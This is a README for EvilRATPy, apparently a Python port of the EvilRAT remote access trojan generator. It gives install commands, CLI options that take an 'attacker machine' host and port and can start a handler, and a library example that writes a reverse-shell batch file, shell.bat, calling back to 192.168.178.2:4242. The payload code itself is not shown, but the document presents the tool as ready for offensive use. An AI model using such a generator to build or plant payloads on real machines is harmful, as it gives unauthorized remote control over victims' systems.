# EvilRATPy

Implementation of [EvilRat by pr0xy-8L4d3](https://github.com/pr0xy-8L4d3/EvilRAT) in Python. No `msfvenom` dependency.

## Installation

```bash
# via git clone
git clone https://github.com/dix0nym/EvilRATPy.git
cd EvilRATPy

# via direct download
wget https://raw.githubusercontent.com/dix0nym/EvilRATPy/main/evilRAT.py
```

## Usage

Python implementation works on Windows and on Linux. Available Options for the payload encoding are the same as the original version (`syswow64` and `noexit`).
`EvilRATPy` can be used as CLI as well as by integrating it in another Python script.

### CLI

```bash
$ python evilRAT.py -h
usage: evilRAT.py [-h] [-o OUTPUT] [--handler] [--no-noexit] [--no-syswow64] lhost lport

Python Implementation of EvilRat

positional arguments:
  lhost                 ip address of attacker machine
  lport                 port of attacker machine

options:
  -h, --help            show this help message and exit
  -o OUTPUT, --output OUTPUT
                        output filename
  --handler             flag to start handler after generating payload
  --no-noexit           disable noexit option on payload
  --no-syswow64         disable usage of syswow64 powershell in payload
```

### Python Library

```python
from pathlib import Path
from evilRAT import createFinalPayload

outputPath = Path("shell.bat")
lhost = "192.168.178.2"
createFinalPayload(outputPath, lhost, 4242)
```
